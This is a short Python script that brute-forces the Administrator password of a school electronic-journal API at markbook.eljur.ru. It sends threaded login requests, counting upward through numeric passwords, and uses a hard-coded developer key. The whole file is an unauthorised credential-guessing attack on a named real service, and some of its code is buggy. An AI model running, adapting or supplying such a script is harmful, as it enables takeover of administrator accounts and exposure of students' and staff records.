import requests as rq
import threading

threads = []
pwd = "0"


def tf(authpassword):
    auth_parameters = {"devkey": devkey, "out_format": "json", "vendor": "markbook",
                       "login": "Administrator", "password": authpassword}
    if rq.get("https://markbook.eljur.ru/apiv3/auth", params=auth_parameters).json()['response']['state'] == 200:
        print("Success!")
        del threads
        exit()
    else:
        print("\nPassword " + password + " unsuccessful!")


devkey = "9235e26e80ac2c509c48fe62db23642c"
login = "Administrator"
password = "0"
auth_params = {"devkey": devkey, "out_format": "json", "vendor": "markbook", "login": login, "password": password}


def brute(password):
    global threads
    if len(threads) > 1000:
        del threads[0]
    thr = threading.Thread(target=tf, args=(password, ))
    thr.start()
    threads.append(thr)


while True:
    brute(password=pwd)
    pwd = str(int(pwd) + 1)
